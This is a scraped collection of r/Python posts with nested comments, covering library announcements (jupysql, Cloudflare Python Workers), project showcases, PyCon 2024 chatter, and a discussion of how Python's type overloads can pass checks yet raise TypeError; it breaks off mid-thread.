    "post_time": "Tuesday, March 26, 2024 at 6:19:25 AM GMT+3",
    "flair_text": "News",
    "post_title": "ipython-sql has been forked",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://ploomber.io/blog/jupysql/",
        "https://duckdb.org/2023/02/24/jupysql.html"
    ],
    "post_content": "Hi r/Python,\nIn case you didn't know, ipython-sql has been forked. The new project has fixed some long-standing issues and added a bunch of new capapabilities:\nSplitting long SQL queries in multiple cells\nPlotting large-scale datasets\nMore flexibility to open database connections\nThe API remains the same, you can replace projects that depend on ipython-sql with jupysql: pip install jupysql\nYou can read more about the project here. There's also a post in DuckDB's blog that you might want to check out, too.",
    "comments": []
},
{
    "post_author": "frocketgaming",
    "post_id": "1buc9ut",
    "post_score": "35",
    "post_time": "Wednesday, April 3, 2024 at 1:40:27 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Who's going to PyCon US 2024?",
    "media": [],
    "post_content": "It's just around the corner. I'll be going on my own so it would be nice to meet up with some people potentially.\nWho plans to go and what speakers / sessions are you looking forward to?",
    "comments": [
        {
            "author": "ryanstephendavis",
            "score": "7",
            "content": "Woohoo! Gonna be my first 😁",
            "replies": [
                {
                    "author": "frocketgaming",
                    "score": "2",
                    "content": "Same here, getting excited :)"
                }
            ]
        },
        {
            "author": "caesarwar",
            "score": "2",
            "content": "Attending online!"
        },
        {
            "author": "DNSGeek",
            "score": "3",
            "content": "I'm not going, I can't get away for reasons, but I bought the online registration and I'll be there virtually. It'll be my 8th PyCon, but my 3rd virtual. Hopefully next year I can go in person.",
            "replies": [
                {
                    "author": "geocromancer",
                    "score": "1",
                    "content": "I cannot see an option for virtual tickets.. some hints, please? ! or You just buy normal ones and everything is also online ?"
                },
                {
                    "author": "edcculus",
                    "score": "1",
                    "content": "Are the virtual sessions saved so you can watch later if needed? At $100, I’d like to sign up for virtual, but I’ll be working through the conference- and won’t necessarily be able to devote all my time to attending live.",
                    "replies": [
                        {
                            "author": "DNSGeek",
                            "score": "2",
                            "content": "Yes, they're all uploaded to YouTube a few months after the event.",
                            "replies": [
                                {
                                    "author": "edcculus",
                                    "score": "1",
                                    "content": "Oh even better. Is it private, as in you need a code/invite to get in if you paid, or do they just eventually put them up for free?"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "QuarterEconomy",
                    "score": "1",
                    "content": "Make sure to wear your mask."
                }
            ]
        },
        {
            "author": "LightShadow",
            "score": "1",
            "content": "Online only this time, but I'm looking forward to it!"
        },
        {
            "author": "ace_hawk5",
            "score": "1",
            "content": "I'll be attending this online it's my first time very cool!"
        },
        {
            "author": "TruesSeeker",
            "score": "1",
            "content": "Hey! I'm pretty new to Python but am also heading to the conference. Feel free to dm me if you want to connect. I don't really use reddit but I can give you my ig."
        },
        {
            "author": "Illustrious_Duck8358",
            "score": "1",
            "content": "I'm new to this sub. How can we sign-up for the event?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "-11",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "Gawd_is_great",
    "post_id": "eazg05",
    "post_score": "1652",
    "post_time": "Sunday, December 15, 2019 at 5:20:07 PM GMT+3",
    "flair_text": "",
    "post_title": "Made my first fractal",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Namensplatzhalter",
            "score": "100",
            "content": "Looks nice. I've just had a look on your code and have to say it looks nicely organised and is easily readable. Kudos to you for writing it like that. Two little suggestions, if you don't mind: Consider using a if __name__ == \"__main__\" block to initialise your script when it's run directly Consider using tuples for your vel_list vel_table as they are immutable Both of those definitely not necessary, just things to think about. :) Best wishes",
            "replies": [
                {
                    "author": "Gawd_is_great",
                    "score": "26",
                    "content": "Thanks for the suggestions =) I have a couple of questions: Why should I use if(__name__==\"main\") ? It wont make a difference..will it? is there a better way than to use vel_list?",
                    "replies": [
                        {
                            "author": "Namensplatzhalter",
                            "score": "50",
                            "content": "if __name__ == \"__main__\" is just a best practice for coding in python. not necessary for such simple apps but good to get in the habit of using it. Using vel_table as a mapper for the direction of the new points is perfectly fine. Is was just suggesting using tuples instead of lists because tuples are immutable and your directions are a fixed set (i.e. 8 directions)"
                        },
                        {
                            "author": "graingert",
                            "score": "3",
                            "content": "It's even better to use: def main(): ... if __name__ == \"__main__\": main() Then you can use module.main as a setuptools entry point"
                        },
                        {
                            "author": "djimbob",
                            "score": "2",
                            "content": "I'm not saying you need it for this, but they didn't really explain the purpose of the clause if __name__ == 'main' clause. Looking at your script lines 1-56 seem to just define classes and functions, and then lines 57 and beyond seem to be doing things (and executing the program). Its good software design to refactor and have the first section defining everything, then the run part of the program in a function # define stuff above def draw_fractal(max_splits = 2**7, size=(700,700)): vel_table = [[0,-1],[-1,-1],[-1,0],[-1,1],[0,1],[1,1],[1,0],[1,-1]] [...] if __name__ == '__main__': draw_fractal() When you run your code python fractal.py it works the same. But now you can open the interpreter up and import fractal without actually popping up a window to draw anything. Then you could maybe call draw_fractal(max_splits=256) or call from another program. Or maybe you decide to create fractal2.py with a Dot2 class that inherits from Dot and is brought in with from fractal import Dot. You wouldn't want that import to start drawing the first fractal. By having 'executing' code (not just function/class/variable definitions) at the top level auto-run, you make code-reuse impossible. E.g., $ ipython In [1]: from fractal import Dot pygame 1.9.4 Hello from the pygame community. https://www.pygame.org/contribute.html 8 At which point a window pops up and starts drawing. Also, I'm not sure why you have del object and del trail at the ends of create and makeTrail as they don't actually do anything (no memory is freed up or anything). And in makeTrail, when objects is an empty list it creates an UnboundLocalError when you try deleting trail. The code del some_var just unsets some_var in memory (and if there are no other references to the memory referenced by some_var it lets the gc give back the allocated memory to the OS on its next collection; though in your case their are other references -- you add the objects to list) and would make it an error to try and reuse some_var. However, all local variables are lost when a function exits (and it would be illegal to use them) -- there's no reason to explicitly delete a local variable at the end of a function."
                        },
                        {
                            "author": "MB1211",
                            "score": "1",
                            "content": "I didn't look at your code but the way it would make a difference is if you wanted to import your module, it will essentially run the module when you import. If you have the if name = main part, that part won't run because the module is not main when it's imported"
                        }
                    ]
                },
                {
                    "author": "ned334",
                    "score": "2",
                    "content": "Where did you look at his code?",
                    "replies": [
                        {
                            "author": "Namensplatzhalter",
                            "score": "3",
                            "content": "He posted a github link in the comments."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Gawd_is_great",
            "score": "35",
            "content": "Source code at : https://github.com/Perseus-Perry/Fractal"
        },
        {
            "author": "sharkbound",
            "score": "17",
            "content": "in Dot.__init__ you are using lists as default values, having mutable default value is very bad and can become a bug very quickly, since functions are objects too, the argument default will all be the same reference each __init__ call so because of this, when you do anything to mutate the default argument, it will affect all the places where the default argument value is used its much better to use a tuple or None or some other immutable value for a default value check do a check in the init code here: https://gist.github.com/785534176eca51545ce7d6cbbbb18e62 console output here: https://gist.github.com/50fbc58ed04fc1ac8089d3497b80c5f1 EDIT 0: also spotted a name inconsistancy for function updatePos in Dot, everything except types/classes should use snake_case, update_pos"
        },
        {
            "author": "vnglst",
            "score": "3",
            "content": "lovely!"
        },
        {
            "author": "muntoo",
            "score": "3",
            "content": "Related: https://www.reddit.com/r/generative/comments/ea3m0l/wave_grower/"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "woat u use it for"
        },
        {
            "author": "Teleswagz",
            "score": "1",
            "content": "Nice you made it look like a brain"
        },
        {
            "author": "otterom",
            "score": "1",
            "content": "Pretty sweet! Ive never used pygame, so it's always fun to see some of the techniques used to make it run. Unrelated: Does that maze repo generate a solvable maze each time?"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "What is this used for?"
        }
    ]
},
{
    "post_author": "Cybasura",
    "post_id": "1bpkn75",
    "post_score": "49",
    "post_time": "Thursday, March 28, 2024 at 5:36:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Makefile Parser for Python",
    "media": [
        "https://github.com/Thanatisia/makefile-parser-python"
    ],
    "post_content": "Hello everyone!\nI am proud to introduce a Makefile Parser for Python that I think will be useful!\nthe link is Thanatisia/makefile-parser-python\nAs an introduction, I have been using python and been following this subreddit for quite awhile now, but this is my first post\nRecently, I've been planning a side-project involving the use of Makefiles in Python, and I required the use of a Makefile parser ala json or pyyaml - whereby you would import a Makefile into python as objects/dictionary/lists. Hence, I started searching for a Makefile Parser.\nThe only parser I've found is PyMake(2) which is cool but it hasnt been updated since 2017 from what I recall and that it is more of a CLI utility, so with that in mind, I went about to make it\nI hope that this will be as useful as it is for me, currently I am using this in a side project and i'm able to format it such that its printing out a typical Makefile structure right off the bat, which is pretty nice.\nAdditional information to the project\nWhat My Project Does\nThis is a Makefile Parser, made in Python. The operational workflow is basically\nStart --> Import File into dictionary --> Manipulation and Usage --> Processing --> Output --> Export\nTarget Audience (e.g., Is it meant for production, just a toy project, etc.)\nThis is a library/package/module by design, much like json or pyyaml as mentioned but a smaller scale at the moment as its just started.\nI'm not sure if it applies for you but its a parser/importer\nComparison (A brief comparison explaining how it differs from existing alternatives.)\nI'm not sure if there are any other Makefile Parsers other than Pymake2, but the idea is similar to the aforementioned ideas",
    "comments": [
        {
            "author": "dydhaw",
            "score": "27",
            "content": "Not sure parsing makefiles is a good idea unless you're setting out to build a make clone. (GNU) makefiles are basically a turing-complete interpreted language and parsing stuff like macros, substitution, pattern rules with multiple expansion phases, and recursive inclusion (which may be conditional) sounds like an absolute nightmare, and those are relatively commonplace. A better approach IMO would be to parse the output of something like make -nd, which would handle most of the interpreting work ETA- generating makefiles, on the other hand, is much more valuable imo, that would make a useful library",
            "replies": [
                {
                    "author": "Cybasura",
                    "score": "4",
                    "content": "Yeah I do see what you mean Essentially, I had this weird idea of making a package manager specifically out of Makefiles (this is the project, if you are interested: Thanatisia/bpm, whereby you import Makefiles created by other project maintainers for their project, and this project is meant to work alongside my build scripts repository which contains Makefiles that is created based on project maintainer's steps I did try finding a Makefile parser but as I mentioned this in the description - the only one I could find was pymake2 which not only hasnt been updated in years - its technically a CLI utility, not a parser, hence I went about to make one I actually have a function in the project that formats the targets and variables data objects into a Makefile syntax structure, and writes it to a Makefile file of your specification, so that part of generating a Makefile is basically available for use That would be a nice idea to add to this, writing a Makefile generator",
                    "replies": [
                        {
                            "author": "thedeepself",
                            "score": "1",
                            "content": "I had this weird idea of making a package manager specifically out of Makefiles With that package manager be cross-platform? Does make run on all platforms?",
                            "replies": [
                                {
                                    "author": "Cybasura",
                                    "score": "1",
                                    "content": "The Package Manager itself will be designed with cross-platform in mind (i.e. I dont plan on using any linux-only concepts/libraries) Cant guarantee the package install methods though, the Package Manager will be using Makefiles containing steps specified by the project maintainers i.e. neovim uses Git clone Cd into package repository make sudo make install So the Makefile will contain targets for the above, with a standardized naming for the targets (custom targets can be added if required) If the project supports cross-platform, that build steps shouldnt have issues At least, thats the plan I use make on windows as well, granted - make requires MinGW-w64 but if you have the make executable/binary and the project supports cross-platform build, yeah make shouldnt be an issue"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "hhoeflin",
            "score": "26",
            "content": "I would recommend you use dataclasses instead of dictionaries. Makes it more robust, typed and is clearer what valid and required fields are.",
            "replies": [
                {
                    "author": "Cybasura",
                    "score": "4",
                    "content": "Thanks, appreciate the feedback! i'll take a look at how I can integrate dataclasses into the parsing logic, I used dictionaries as it works as a proof of concept and key-values makes it (arguably) easier to visualize from the ground up Currently I'm using this in afew of my side projects as a user test and it seems to work at the moment, what are your thoughts with regards to the current state of usability?"
                }
            ]
        },
        {
            "author": "Drewdledoo",
            "score": "1",
            "content": "Maybe I’m missing something but have you heard of Snakemake?",
            "replies": [
                {
                    "author": "Cybasura",
                    "score": "1",
                    "content": "I wrote this following explanation initially on another comment also mentioned about finding an existing solution SnakeMake, like Spock as mentioned by another individial, is indeed a Makefile Package Manager by technicality, and its more of a build system, but please read what I wrote above - BPM is a Makefile Package Manager, but its primary skeleton is that it is designed to work together with my build scripts repository Makefile scripts that comes with standardized naming conventions for common functions correlating to steps defined by project maintainers. The install logic of the package manager is also still a Work-In-Progress"
                }
            ]
        },
        {
            "author": "0x1e",
            "score": "-4",
            "content": "Not to rain on your parade but there are better options if you use the tools available to you. You want a real parser, I suggest pyparsing",
            "replies": [
                {
                    "author": "Cybasura",
                    "score": "3",
                    "content": "I've took a look, it...doesnt seems like a Makefile Parser to me though, more like a general grammar parser I'm sure its useful, but how does this fit with what I explained? Additionally, I'm curious by the \"real parser\" point, what makes a real parser? Is mine not a parser?"
                }
            ]
        }
    ]
},
{
    "post_author": "TheMadFratter",
    "post_id": "1bu9r1f",
    "post_score": "17",
    "post_time": "Tuesday, April 2, 2024 at 11:58:32 PM GMT+3",
    "flair_text": "News",
    "post_title": "Serverless Python Support in Cloudflare Workers",
    "media": [
        "https://blog.cloudflare.com/python-workers"
    ],
    "post_content": "Today Cloudflare has announced support for Python in their Clouldflare Workers serverless environment. This allows Python to be run at the edge on their global network using a combination of Pyodine and the V8 runtime.\nAnnouncement can be found on the Cloudflare Blog: https://blog.cloudflare.com/python-workers",
    "comments": [
        {
            "author": "Praxis_of_symmetry",
            "score": "1",
            "content": "Neat"
        }
    ]
},
{
    "post_author": "houseofleft",
    "post_id": "1bls2ay",
    "post_score": "7",
    "post_time": "Saturday, March 23, 2024 at 4:22:57 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "UFO Tools- functional programming in python",
    "media": [
        "https://github.com/benrutter/ufo-tools"
    ],
    "post_content": "I shared a \"monads in python library\" a little while back on here- since then I've been toying with and expanding things out into a more general project for helping functional programming patterns in python.\n[I had (am having) a bunch of fun making this - thought I'd share here!](https://github.com/benrutter/ufo-tools)\nWhat my project does: A simple library with utilities for functional programming in Python.\nTarget Audience: It's meant for use in actual production contexts, but it's still in a very early and experimental phase. It's probably most helpful right now as a learning resource.\nComparison: Most similar project I know of is the Returns library, which is great, but a lot more heavy weight. It has more of an expectation of being used for everything, rather than a drop in as-and-when tool.\nI'd love any feedback in general (as well as any healthy flamewars around the herecy or one-true-way of functional programming)",
    "comments": [
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Thanks bot, but I'm not! It's a showcase of a project",
            "replies": [
                {
                    "author": "houseofleft",
                    "score": "1",
                    "content": "Thanks bot, but I'm not! It's a showcase of a project"
                }
            ]
        }
    ]
},
{
    "post_author": "insane_playzYT",
    "post_id": "i5r1es",
    "post_score": "1695",
    "post_time": "Saturday, August 8, 2020 at 5:09:04 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Post all of your beginner projects to r/MadeInPython, this sub is being overrun with them",
    "media": [
        "https://www.reddit.com/r/madeinpython/",
        "https://www.reddit.com/r/Python/",
        "https://www.reddit.com/r/learnpython/"
    ],
    "post_content": "r/madeinpython is a subreddit specifically for what you want; posting your projects. No one wants to see them here. This subreddit is genuinely one of the lowest quality programming subreddits on the site because of the amount of beginner project showcases.\nr/learnpython is also much more appropriate than here. r/Python should be a place to discuss Python, post things about Python, not beginner projects.",
    "comments": [
        {
            "author": "[deleted]",
            "score": "56",
            "content": "As someone who falls into the python newbie camp, I agree. I come here to read about the language, changing features and progression. I certainly do not want to see posts outputting completed tutorials. The direction to use r/learnpython for such things is pinned and I happily visit there when I need help or a bit of motivation."
        },
        {
            "author": "GuybrushThreepwo0d",
            "score": "58",
            "content": "There was a similar thread recently that lead to the creation of r/PythonDevelopers. I think the idea was to have more meaningful discussion there, as this sub seems to be unsalvageable."
        },
        {
            "author": "Pythag0ras2000",
            "score": "27",
            "content": "And as much as you migt think I care about tons of webscraping shit, I don't. What if we don't segregate between beginner and advanced projects and just get rid of projects displayed here altogether? I'm not saying we should, I'm saying that you're gonna have to sacrifice it too if you care about it that much."
        },
        {
            "author": "CraigAT",
            "score": "25",
            "content": "To my mind people's personal projects should be posted in r/MadeInPython. People who need help with those projects should post in r/LearnPython. Everyday minor Python news and updates should go to the new r/PythonDevelopers. Major Python changes and news that will affect the majority of users should be posted to r/Python. Meanwhile anyone with a good tutorial, guide or cheat sheet should post to r/PythonTips. This should be made clear with a sticky in all of the Python subs and then followed through by the relevant mods when they see a post in the sub, by messaging the user (very nicely because they probably weren't aware), adding a sticky post to that thread and a flair \"Better in r/LearnPython\" (or wherever) for others to see and learn from, before they make the same mistake themselves. The biggest issue I can see is at the moment is that there is not enough visible signposting (especially for mobile users) that other subs even exist and very little information on what the purpose of each sub is. I mean this in a hopefully constructive way, because I enjoy these subs and want to help make them better and more useful for everyone beginners and experts."
        },
        {
            "author": "ironmagnesiumzinc",
            "score": "33",
            "content": "What about a weekly “Projects” megathread?"
        },
        {
            "author": "hombre_lobo",
            "score": "7",
            "content": "I dont mind the beginner questions, the showcases belong somewhere else"
        },
        {
            "author": "unltd_J",
            "score": "103",
            "content": "😂 good call. This subreddit would also benefit from immediately removing posts that seem like learnpython posts."
        },
        {
            "author": "IAmKindOfCreative",
            "score": "1",
            "content": "Given that your issue seems to be focused on the beginner projects, I think you'll enjoy hearing about what you can do with flair. To help make the sub more enjoyable to folks who don’t want to see new programmer’s projects, the flair system we’ve added helps split out topics. (Originally we focused on projects with I Made This flair, but because of the difference between beginner and intermediate and above posts, we broke it into beginner showcase and intermediate showcase to help address the difference in project levels.) If there’s a group of submissions that you dislike, use the flair to filter them out following this outline. It should immensely help your experience. We’ve got a lot of other changes we’re exploring to make the sub a better overall experience, but the flair is a tool that lets you implement these changes outlined in the post."
        },
        {
            "author": "[deleted]",
            "score": "15",
            "content": "Post all your python news to r/pythonnews. Post all your advanced python to r/advancedpython. Pretty soon nothing will be allowed in r/python and OP will finally be content."
        }
    ]
},
{
    "post_author": "SwiftGloss",
    "post_id": "1bndrfv",
    "post_score": "18",
    "post_time": "Monday, March 25, 2024 at 4:32:49 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "🚀 Goprox: Simplify Google searches with automatic proxy handling and user-agent selection.",
    "media": [
        "https://github.com/Cosetttee/Goprox"
    ],
    "post_content": "What My Project Does: Goprox is a Python module that revolutionizes Google searches by automatically checking and using proxies, eliminating the need for user input. With Goprox, users can enjoy seamless searching without worrying about proxy configuration or getting blocked.\nTarget Audience: Goprox is perfect for developers seeking to automate Google searches for web scraping, automation, or data collection tasks. It's also ideal for anyone who desires a hassle-free search experience without the hassle of manual proxy management.\nComparison: Compared to existing alternatives, Goprox stands out with its focus on automatic proxy handling. Unlike other solutions that require manual proxy input, Goprox streamlines the process by autonomously managing proxies for each search query.\nExperience the power of Goprox on GitHub today! Your feedback and contributions are greatly appreciated.",
    "comments": [
        {
            "author": "jnwatson",
            "score": "6",
            "content": "Enough with the GPT stuff."
        },
        {
            "author": "bitdoze",
            "score": "0",
            "content": "Nice!",
            "replies": [
                {
                    "author": "SwiftGloss",
                    "score": "1",
                    "content": "Thank you! The project is still currently in beta but hope you found it useful!"
                }
            ]
        },
        {
            "author": "Snoo53903",
            "score": "1",
            "content": "Am I able to add my proxy urls?",
            "replies": [
                {
                    "author": "benefit_of_mrkite",
                    "score": "1",
                    "content": "If you change the code where OP calls the free proxy library then yes"
                }
            ]
        },
        {
            "author": "ItsTobsen",
            "score": "0",
            "content": "Should make an async version.",
            "replies": [
                {
                    "author": "SwiftGloss",
                    "score": "1",
                    "content": "Thank you for the good suggestion. I might implement that in a day or two."
                }
            ]
        },
        {
            "author": "benefit_of_mrkite",
            "score": "1",
            "content": "Constructive feedback - you’re calling the free proxy library with defaults. That means that the returned proxy could be http instead of https and there’s no guarantee on which country the returned proxy will be from. Meaning you could easily get the Google results back in a foreign language.",
            "replies": [
                {
                    "author": "SwiftGloss",
                    "score": "1",
                    "content": "About the https that was my bad I assumed i set the `https` args already, upon checking I didn't. Thank you for pointing it out, Its fixed now. And the reason for not setting a country for the proxies is cause it lowers the amount of proxies you receive and sometimes in a specific country there are no https proxies. So to resolve this I kept it as for all countries."
                }
            ]
        }
    ]
},
{
    "post_author": "nez_har",
    "post_id": "1bpdzfp",
    "post_score": "23",
    "post_time": "Thursday, March 28, 2024 at 12:44:43 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Load Apple's .numbers Files into Pandas",
    "media": [
        "https://nezhar.com/blog/load-apple-numbers-files-python-pandas-using-containers/"
    ],
    "post_content": "I recently ran into some challenges while trying to work with Apple's .numbers files on Linux. After a bit of experimentation, I figured out a workflow that simplifies the process. If you're planning to use .numbers files and need to load them into pandas, I've created a tutorial that covers the required dependencies and the steps to follow: https://nezhar.com/blog/load-apple-numbers-files-python-pandas-using-containers/.\nHas anyone else here worked with .numbers files in Python? I’d love to hear about your experiences or any tips you might have.",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1bnter2",
    "post_score": "2",
    "post_time": "Tuesday, March 26, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "ProgramPristine5099",
            "score": "1",
            "content": "How can I use WebRTC and Python to remote control my iPhone?"
        },
        {
            "author": "AlmostLikeAzo",
            "score": "1",
            "content": "In the following code, pandas' dataframe implements a custom behaviour on access, how are they doing that kind of wizardry ? import pandas as pd a={\"foo\": True,\"bar\":1} b={\"foo\": False,\"bar\":2} c={\"foo\": True,\"bar\":3} df=pd.DataFrame([a, b, c]) df2 = df[df.foo == True] # Prints content of a, b, c print(df) # Prints content of a, c print(df2) ar = [a, b, c] # Fails ar2 = ar[ar.foo == True]",
            "replies": [
                {
                    "author": "Mehdi2277",
                    "score": "1",
                    "content": "They override getitem. There are many dunder methods you can override to customize behaviors like this. Even basic attribute access can be customized by overriding getattr or getattribute. Almost everything is a method call and most of time you can override it. Edit: The bolds are intended to be double underscore before and after but unsure how to disable that formatting on mobile Reddit app."
                }
            ]
        }
    ]
},
{
    "post_author": "theowni",
    "post_id": "1bu2ckl",
    "post_score": "39",
    "post_time": "Tuesday, April 2, 2024 at 6:59:26 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Security Code Challenge for Developers & Ethical Hackers - Damn Vulnerable RESTaurant API",
    "media": [
        "https://devsec-blog.com/2024/04/security-code-challenge-for-developers-ethical-hackers-the-damn-vulnerable-restaurant/"
    ],
    "post_content": "Security Code Challenge for Developers & Ethical Hackers – Damn Vulnerable RESTaurant\nA FastAPI based intentionally vulnerable web application teaching the most common security vulnerabilities in API through a dedicated game.\nDamn Vulnerable RESTaurant is operated by a mysterious Chef who has discovered that threat actors were able to compromise his restaurant’s API and the underlying system. He suspects that a competing restaurant located across the street might be involved in this attack! The goal of the challenge is to identify and fix vulnerabilities based on provided hints. During this adventure, you will have the opportunity to investigate how the attack was carried out and fix security issues to safeguard the application. Moreover, you can uncover the identity of the person behind the attack by the end of this adventure.",
    "comments": [
        {
            "author": "koldakov",
            "score": "1",
            "content": "That’s interesting, thank you. I would add a section about security theatre. I think it’s important to understand what’s that. Unfortunately, I’ve seen it many times when \"developer leaders\" used a lot of smart words like encryption, fle, secret key storage, etc, but at the same time used their finger to unlock Mac, which contains plain texts passwords to access prd db",
            "replies": [
                {
                    "author": "theowni",
                    "score": "1",
                    "content": "thanks for the feedback u/koldakov !"
                }
            ]
        }
    ]
},
{
    "post_author": "diddilydiddilyhey",
    "post_id": "cz50wq",
    "post_score": "1690",
    "post_time": "Tuesday, September 3, 2019 at 4:40:52 PM GMT+3",
    "flair_text": "",
    "post_title": "I used reinforcement learning with python to solve Numberphile's \"cat and mouse\" game!",
    "media": [
        "https://preview.redd.it/78xgkwmbudk31.gif?format=png8&s=389665d4c7a2f8aaa5a5cefdec77bd5acaa42250"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "diddilydiddilyhey",
            "score": "156",
            "content": "I saw the game that inspired this in this Numberphile video. A post about the project is here, let me know if you have any feedback or questions!"
        },
        {
            "author": "m3l0n",
            "score": "36",
            "content": "This is really cool. If anyone wants to try it, I wasted my morning watching videos on it and ended up finding an interactive website that somebody made. https://prajwalsouza.github.io/Experiments/Game-Of-Cat-And-Mouse.html"
        },
        {
            "author": "Empero6",
            "score": "44",
            "content": "That’s actually pretty cool."
        },
        {
            "author": "JanDerion47",
            "score": "30",
            "content": "ooh, math and python, two of my favorite things"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Impressive!"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Good Work!"
        },
        {
            "author": "DeviousNes",
            "score": "11",
            "content": "How many iterations do I need to watch before it learns?"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "Source code?"
        },
        {
            "author": "jai_dewani",
            "score": "5",
            "content": "Good work, now I got to learn about this because I saw this gif too many times :P"
        },
        {
            "author": "kimilil",
            "score": "3",
            "content": "I recall this program called Geometer's Sketchpad and it had a file with 3 sheep and a shepherd dog which does a pretty good job of herding, though the field is set up to not end the simulation if the sheep escapes the circle, and the shepherd dog can run in 2d space. No AI/ML, just pure math."
        }
    ]
},
{
    "post_author": "soap94",
    "post_id": "1bpuej9",
    "post_score": "0",
    "post_time": "Thursday, March 28, 2024 at 3:29:44 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "No More Cutting in Line: Crafting Fairness in Queues using RQ in Python",
    "media": [
        "https://blog.kusho.ai/no-more-cutting-in-line-crafting-fairness-in-queues/"
    ],
    "post_content": "I was trying to tackle the problem of queue fairness and here's how I solved it.",
    "comments": [
        {
            "author": "OH-YEAH",
            "score": "1",
            "content": "that's a lot of juxtaposition to say you calculate which shard to send it to... i wouldn't call it solved tho, right? more of a shuffle queue, but it can still be saturated. Not so much of a scheduling algorithm as default n job shuffle? (did I read that right?) You mention starvation a few times, yet starvation tolerance is a parameter you can tune to allow more efficiencies by allowing some starvation to improve throughput and limit wait times in total - then there's flags and other things to consider... maybe get to that point then post? what are the goals of this scheduler? \"fair\" has no meaning. you'll be sent to the outer fringes for this for sure! ;)",
            "replies": [
                {
                    "author": "Kiuhnm",
                    "score": "1",
                    "content": "Yeah, it's a simple \"use more queues and cycle over them in a round-robin fashion popping one job from each one of them\"."
                }
            ]
        }
    ]
},
{
    "post_author": "Kiuhnm",
    "post_id": "1bls4b3",
    "post_score": "6",
    "post_time": "Saturday, March 23, 2024 at 4:25:36 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Code type checks but then `TypeError`s",
    "media": [],
    "post_content": "Have you noticed that Python's static type system is unsound? Look at this code:\nfrom typing import overload\n\n@overload\ndef f(x: int) -> str: ...\n@overload\ndef f(x: str) -> int: ...\ndef f(x: int | str) -> int | str:\n    match x:\n        case int():\n            return 1\n        case str():\n            return 'a'\n\nprint('a' + f(1))\nprint(1 + f('a'))\nThe code above type checks, but raises TypeError when executed. With proper overloading this would never happen.\nCan you think of other cases?\nYou're not allowed to use cast, Any, to omit type hints, to use stubs, or to cheat in similar ways.",
    "comments": [
        {
            "author": "TMiguelT",
            "score": "23",
            "content": "To start with, I'm fairly sure this isn't a flaw in Python's type system, but it's true that neither mypy nor pyright seems to catch this, which makes it quite an interesting issue. In mypy at least, it seems that there are currently two checks: That the type signature of the function implementation is a superset of all the overloads, which passes in your case since str is compatible with int | str That the implementation body is compatible with the implementation type signature. This also passes because 'a' is compatible with int | str However, what should really happen is that the implementation body should be sequentially checked against each overload, not against the implementation type signature. This seems to be an open issue: https://github.com/python/mypy/issues/11086 https://github.com/python/mypy/issues/8867",
            "replies": [
                {
                    "author": "TMiguelT",
                    "score": "5",
                    "content": "Also some interesting discussion of this issue and why it's difficult in the context of pyright: https://github.com/microsoft/pyright/issues/2806."
                },
                {
                    "author": "Kiuhnm",
                    "score": "1",
                    "content": "To start with, I'm fairly sure this isn't a flaw in Python's type system[...] Yes, you're right, the single implementation is not (or shouldn't be) a technical obstacle."
                }
            ]
        },
        {
            "author": "muikrad",
            "score": "8",
            "content": "A singledispatch would catch it: @overload def f(x: int) -> str: ... @overload def f(x: str) -> int: ... def f(x: int | str) -> int | str: return _f_dispatch(x) @singledispatch def _f_dispatch(x: int | str) -> int | str: raise NotImplementedError @_f_dispatch.register def f_int(x: int) -> str: return 1 @_f_dispatch.register def f_str(x: str) -> int: return 'a' print('a' + f(1)) print(1 + f('a'))",
            "replies": [
                {
                    "author": "muikrad",
                    "score": "5",
                    "content": "Incompatible return value type (got \"int\", expected \"str\")  [return-value] Incompatible return value type (got \"str\", expected \"int\")  [return-value]"
                },
                {
                    "author": "Tobotimus",
                    "score": "3",
                    "content": "This shows there is pretty poor integration between overload and singledispatch, two decorators which could be closely related. Turning one function definition into six so that you can have just two cases for different types seems like madness. If I saw this code in a PR I would ask them to remove the overloads and dispatches in favour of a single function.",
                    "replies": [
                        {
                            "author": "muikrad",
                            "score": "1",
                            "content": "Well this is a silly example right. You rarely build a function that returns an int on str and a str on int 😉 but if you did, a simple isinstance/else in one function would work indeed, or even better, do 2 functions. Also, you never need to mix overloads and singledispatch this way, I was just being creative for the sake of answering OP's challenge. But in more complex scenarios, you'll be chaining \"isinstance\" calls and this can messy and hard to read, that's why the dispatch is nice. You can also register functions at runtime, which gets really practical in some cases (one typical case is a de/serialization lib where users can register custom types). The overload has a different purpose with no runtime functionality. It's only there to hint about the allowed contracts for a function and lead the rest of the type checking context. It shines in clearing up confusion around \"Union\" of types, but as you mention, having different functions with different signatures is often a better and simpler option. The overload is kind of niche. One nice use out there in the wild is what boto3 does when you ask for a client. It will look at the string you passed in (ec2, ssm, etc) in order to return a different instance type. You can do that by using a Literal inside an overload. But we could also have one function per client kind (get_ec2_client, get_ssm_client) and it would be fine as well from the user's perspective. The code on boto3's side would however be much more terse. You'd have N functions reaching out to that function that basically checks a key in a dict to obtain the correct factory. With the overload they coded the function once, and typed overloads to define what you get based on what you gave. You can also generate the code for these overloads, so from a maintainer's perspective, it's one of those little tools that can make my life easier.",
                            "replies": [
                                {
                                    "author": "Tobotimus",
                                    "score": "1",
